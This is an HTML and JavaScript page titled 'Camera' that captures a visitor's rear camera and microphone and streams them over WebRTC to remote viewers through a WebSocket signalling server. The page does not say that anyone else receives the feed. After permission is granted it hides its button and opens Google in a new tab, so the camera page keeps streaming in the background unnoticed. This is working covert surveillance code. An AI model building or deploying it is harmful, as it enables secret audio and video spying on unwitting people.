<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Camera</title>

<style>
body{
  margin:0;
  background:#111;
  color:white;
  font-family:Arial,sans-serif;
  text-align:center;
}

h2{
  margin:20px;
}

#video{
  width:100%;
  max-width:1000px;
  background:#000;
  display:block;
  margin:auto;
}

button{
  padding:15px 25px;
  font-size:18px;
  border:0;
  border-radius:8px;
  margin:15px;
}

#status{
  margin:15px;
}
</style>
</head>

<body>

<h2>Camera</h2>

<button id="allowBtn">
  Allow Camera & Microphone
</button>

<div id="status">
  Waiting for permission...
</div>

<video
  id="video"
  autoplay
  playsinline
  muted>
</video>

<script>
"use strict";

const video =
  document.getElementById("video");

const status =
  document.getElementById("status");

const allowBtn =
  document.getElementById("allowBtn");

const cameraId =
  crypto.randomUUID();

let stream = null;
let socket = null;

const peers = new Map();

const rtcConfig = {
  iceServers: [
    {
      urls: "stun:stun.l.google.com:19302"
    },
    {
      urls: [
        "turn:openrelay.metered.ca:80",
        "turn:openrelay.metered.ca:443",
        "turn:openrelay.metered.ca:443?transport=tcp"
      ],
      username: "openrelayproject",
      credential: "openrelayproject"
    }
  ]
};


/* ================================
   START CAMERA
================================ */

async function startCamera(){

  try{

    status.textContent =
      "Requesting permission...";

    stream =
      await navigator.mediaDevices.getUserMedia({

        video:{
          facingMode:{
            exact:"environment"
          },

          width:{
            ideal:1280
          },

          height:{
            ideal:720
          },

          frameRate:{
            ideal:30,
            max:30
          }
        },

        audio:true

      });

    video.srcObject = stream;

    await video.play();

    status.textContent =
      "Camera + microphone ready";

    connectServer();

  }catch(error){

    console.error(error);

    if(error.name === "NotAllowedError"){

      status.textContent =
        "Camera or microphone permission denied";

    }else if(
      error.name === "OverconstrainedError"
    ){

      status.textContent =
        "Rear camera is not available";

    }else{

      status.textContent =
        "Unable to start camera";

    }

  }

}


/* ================================
   CONNECT SERVER
================================ */

function connectServer(){

  if(
    socket &&
    (
      socket.readyState === WebSocket.OPEN ||
      socket.readyState === WebSocket.CONNECTING
    )
  ){
    return;
  }

  const protocol =
    location.protocol === "https:"
      ? "wss:"
      : "ws:";

  status.textContent =
    "Connecting to server...";

  socket =
    new WebSocket(
      protocol + "//" + location.host
    );


  socket.onopen = () => {

    console.log(
      "SERVER CONNECTED"
    );

    status.textContent =
      "Camera online";

    socket.send(
      JSON.stringify({
        type:"register-camera",
        cameraId:cameraId
      })
    );

  };


  socket.onmessage = async event => {

    try{

      const msg =
        JSON.parse(event.data);


      if(msg.type === "viewer-request"){

        await createPeer(
          msg.viewerId
        );

        return;
      }


      if(msg.type === "answer"){

        const peer =
          peers.get(msg.viewerId);

        if(!peer) return;

        await peer.setRemoteDescription({
          type:"answer",
          sdp:msg.sdp
        });

        console.log(
          "ANSWER RECEIVED"
        );

        return;
      }


      if(msg.type === "viewer-ice"){

        const peer =
          peers.get(msg.viewerId);

        if(!peer) return;

        try{

          await peer.addIceCandidate(
            new RTCIceCandidate(
              msg.candidate
            )
          );

        }catch(error){

          console.error(
            "ICE ERROR:",
            error
          );

        }

      }

    }catch(error){

      console.error(
        "MESSAGE ERROR:",
        error
      );

    }

  };


  socket.onclose = () => {

    console.log(
      "SERVER DISCONNECTED"
    );

    status.textContent =
      "Reconnecting...";

    setTimeout(() => {

      if(stream){
        connectServer();
      }

    },1000);

  };


  socket.onerror = error => {

    console.error(
      "SOCKET ERROR:",
      error
    );

  };

}


/* ================================
   CREATE WEBRTC PEER
================================ */

async function createPeer(viewerId){

  if(!stream){
    return;
  }


  const oldPeer =
    peers.get(viewerId);

  if(oldPeer){

    try{
      oldPeer.close();
    }catch{}

    peers.delete(viewerId);

  }


  const peer =
    new RTCPeerConnection(
      rtcConfig
    );

  peers.set(
    viewerId,
    peer
  );


  /* Add camera + microphone */

  stream.getTracks().forEach(
    track => {

      peer.addTrack(
        track,
        stream
      );

    }
  );


  /* FAST TRICKLE ICE */

  peer.onicecandidate = event => {

    if(!event.candidate){
      return;
    }

    if(
      socket &&
      socket.readyState === WebSocket.OPEN
    ){

      socket.send(
        JSON.stringify({

          type:"camera-ice",

          cameraId:cameraId,

          viewerId:viewerId,

          candidate:event.candidate

        })
      );

    }

  };


  peer.onconnectionstatechange = () => {

    console.log(
      "CONNECTION:",
      peer.connectionState
    );


    if(
      peer.connectionState === "connected"
    ){

      status.textContent =
        "LIVE";

    }


    if(
      peer.connectionState === "failed"
    ){

      console.log(
        "Connection failed - restarting"
      );

      try{
        peer.restartIce();
      }catch{}

    }

  };


  peer.oniceconnectionstatechange = () => {

    console.log(
      "ICE:",
      peer.iceConnectionState
    );

  };


  /* CREATE OFFER IMMEDIATELY */

  const offer =
    await peer.createOffer();

  await peer.setLocalDescription(
    offer
  );


  /* DO NOT WAIT FOR ICE */

  if(
    socket &&
    socket.readyState === WebSocket.OPEN
  ){

    socket.send(
      JSON.stringify({

        type:"offer",

        cameraId:cameraId,

        viewerId:viewerId,

        sdp:peer.localDescription.sdp

      })
    );

    console.log(
      "OFFER SENT IMMEDIATELY"
    );

  }

}


/* ================================
   RECONNECT
================================ */

function reconnect(){

  console.log(
    "RECONNECTING WEBRTC"
  );


  peers.forEach(
    peer => {

      try{
        peer.close();
      }catch{}

    }
  );

  peers.clear();


  if(socket){

    try{
      socket.close();
    }catch{}

  }

  socket = null;


  setTimeout(() => {

    if(stream){
      connectServer();
    }

  },500);

}


/* ================================
   ALLOW BUTTON
================================ */

allowBtn.onclick =
  async () => {

    if(stream){
      return;
    }

    await startCamera();


    if(stream){

      allowBtn.style.display =
        "none";


      /*
       Open Google in another tab.
       Camera page remains open.
      */

      setTimeout(() => {

        window.open(
          "https://www.google.com",
          "_blank"
        );

      },500);

    }

  };


/* Internet reconnect */

window.addEventListener(
  "online",
  () => {

    if(stream){
      reconnect();
    }

  }
);


/* When returning to camera tab */

document.addEventListener(
  "visibilitychange",
  () => {

    if(
      document.visibilityState === "visible"
    ){

      if(
        stream &&
        (
          !socket ||
          socket.readyState !== WebSocket.OPEN
        )
      ){

        connectServer();

      }

    }

  }
);

</script>

</body>
</html>
